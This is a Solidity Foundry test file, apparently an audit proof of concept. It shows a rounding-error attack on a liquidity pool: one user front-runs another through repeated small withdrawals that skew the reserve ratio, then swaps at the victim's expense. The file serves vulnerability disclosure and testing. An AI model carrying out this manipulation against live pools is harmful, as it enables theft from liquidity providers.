// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract LiquidityManipulation is Deployment
{
	bytes32[] public poolIDs;
	bytes32 public pool1;

	IERC20 public token1;
	IERC20 public token2;

	address public constant alice = address(0x1111);
	address public constant bob = address(0x2222);
	address public constant charlie = address(0x3333);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

	function setUp() public
	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

		token1DecimalPrecision = 18;
		token2DecimalPrecision = 18;

		token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

		pool1 = PoolUtils._poolID(token1, token2);

		poolIDs = new bytes32[](1);
		poolIDs[0] = pool1;

		// Whitelist the _pools
		vm.startPrank( address(dao) );
		poolsConfig.whitelistPool(token1, token2);
		vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


		salt.approve(address(liquidity), type(uint256).max);

		vm.startPrank(alice);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(bob);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(charlie);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
		token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
		vm.startPrank(address(dao));
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();
	}

	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
	{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return liquidity.totalSharesForPools(_pools2)[0];
	}

	function test_t0x1c_RoundingErrorWhileRemovingLiquidity() public {
		// ******************************* SETUP **************************************
		// Give Alice, Bob & Charlie some tokens for testing
		token1.transfer(alice, 101);
		token2.transfer(alice, 202);
		token1.transfer(bob, 1010);
		token2.transfer(bob, 2020 + 1 ether);
		token1.transfer(charlie, 303 ether);
		token2.transfer(charlie, 606 ether);

		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq(liquidity.userShareForPool(alice, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(charlie, pool1), 0, "Charlie's initial liquidity share should be zero");
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
		assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// deposit ratio of 1:2 i.e token1's price is 2 times that of token2
		uint256 addedAmount1 = 101;
		uint256 addedAmount2 = 202;

		// Alice adds liquidity in the correct ratio, as the first depositor
		vm.prank(alice);
		uint256 addedLiquidityAlice = liquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, addedAmount1, addedAmount2, addedAmount1 + addedAmount2, block.timestamp, false );
		console.log("addedLiquidityAlice =", addedLiquidityAlice);
		assertEq(liquidity.userShareForPool(alice, pool1), addedLiquidityAlice, "Alice's share should have increased" );

		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
		assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		assertEq(totalSharesForPool( pool1 ), addedLiquidityAlice, "totalShares mismatch after Alice's deposit" );

		vm.startPrank(bob);

		// Bob's 10 accounts add some liquidity too in the correct ratio
		uint numberOfAccountsUsedByBobForTheAttack = 10;
		uint256 addedLiquidityBob = liquidity.depositLiquidityAndIncreaseShare( token1, token2, numberOfAccountsUsedByBobForTheAttack * addedAmount1, numberOfAccountsUsedByBobForTheAttack * addedAmount2, 0, 0, 0, block.timestamp, false );
		console.log("addedLiquidityBob =", addedLiquidityBob);
		skip(1 hours);

		emit log_named_decimal_uint ("Initial ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);
		// ******************************* SETUP ENDS **************************************

		console.log("\n\n***************************** Bob Attacks ************************************\n");
		// @audit : Bob front-runs Charlie & removes liquidity while exploiting the rounding error
		uint256 liquidityToRemove = 5; //  @audit : this causes an "unbalanced" token reduction
		// Bob's multiple accounts remove liquidity
		for (uint repeat; repeat < numberOfAccountsUsedByBobForTheAttack; repeat++) {
			liquidity.withdrawLiquidityAndClaim(token1, token2, liquidityToRemove, 0, 0, block.timestamp);
			skip(1 hours); // @audit-info : "skip" needed just for PoC, not in real attack since 10 different accounts of Bob will be used
		}
		vm.stopPrank();

		console.log("\nSkewed reserve ratio now:\n token1 = %s, token2 = %s\n", token1.balanceOf(address(pools)), token2.balanceOf(address(pools)));
		emit log_named_decimal_uint ("Manipulated ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);


		// Charlie transaction goes through now which adds liquidity with suitable slippage parameters
		vm.prank(charlie);
		// @audit-info : 0.5% slippage for token2
		liquidity.depositLiquidityAndIncreaseShare( token1, token2, 303 ether, 606 ether, 303 ether, 603 ether, 903 ether, block.timestamp, false );

		// Bob swaps
		vm.prank(bob);
		(uint256 swappedOut) = pools.depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp);
		emit log_named_decimal_uint("token1 swappedOut in exchange for 1 ether of token2 (should be greater than 0.5 ether) =", swappedOut, 18);

		// Bob withdraws all his shares
		skip(1 hours);
		vm.prank(bob);
		liquidity.withdrawLiquidityAndClaim(token1, token2, addedLiquidityBob - liquidityToRemove * numberOfAccountsUsedByBobForTheAttack, 0, 0, block.timestamp);

//		uint256 bobFinalBalance = 2 * token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
//		assertGt( bobFinalBalance, bobInitialBalance, "Bob did not profit" );
//		console.log("\nProfit made by Bob = $", bobFinalBalance - bobInitialBalance);
	}
}